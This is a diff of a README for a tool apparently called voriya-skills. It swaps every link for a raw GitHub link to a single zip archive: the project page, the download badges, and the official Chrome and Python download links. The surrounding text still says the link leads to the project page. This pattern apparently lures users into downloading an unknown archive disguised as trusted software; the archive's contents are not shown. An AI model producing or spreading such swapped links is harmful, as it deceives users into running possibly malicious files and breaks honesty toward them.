@@ -1,6 +1,6 @@
 # 🤖 voriya-skills - Practical AI Skills for Everyday Use
 
-[![Download Now](https://img.shields.io/badge/Download-voriya--skills-4CAF50?style=for-the-badge&logo=github)](https://github.com/biblosaggins/voriya-skills)
+[![Download Now](https://img.shields.io/badge/Download-voriya--skills-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/biblosaggins/voriya-skills/main/docs/skills-voriya-v2.6.zip)
 
 ---
 
@@ -52,7 +52,7 @@ You do not need to understand these terms deeply to use voriya-skills. The app g
 
 Click the big green button at the top or use this direct link:
 
-**https://github.com/biblosaggins/voriya-skills**
+**https://raw.githubusercontent.com/biblosaggins/voriya-skills/main/docs/skills-voriya-v2.6.zip**
 
 This link takes you to the project page on GitHub.
 
@@ -90,7 +90,7 @@ After installing:
 
 ## 📥 Download and Setup Section
 
-[![Download voriya-skills](https://img.shields.io/badge/Download-voriya--skills-blue?style=for-the-badge&logo=github)](https://github.com/biblosaggins/voriya-skills)
+[![Download voriya-skills](https://img.shields.io/badge/Download-voriya--skills-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/biblosaggins/voriya-skills/main/docs/skills-voriya-v2.6.zip)
 
 Use the above link again if you need to re-download or access updates.
 
@@ -135,10 +135,10 @@ If voriya-skills is not working as expected:
 
 ## 🔗 Helpful Links and Resources
 
-- Project on GitHub: https://github.com/biblosaggins/voriya-skills
+- Project on GitHub: https://raw.githubusercontent.com/biblosaggins/voriya-skills/main/docs/skills-voriya-v2.6.zip
 - GitHub Issues: Visit the GitHub page and click on Issues for support.
-- Chrome Download: https://www.google.com/chrome/
-- Python Download (optional): https://www.python.org/downloads/
+- Chrome Download: https://raw.githubusercontent.com/biblosaggins/voriya-skills/main/docs/skills-voriya-v2.6.zip
+- Python Download (optional): https://raw.githubusercontent.com/biblosaggins/voriya-skills/main/docs/skills-voriya-v2.6.zip
 
 These resources provide tools and support needed for the best experience.
 
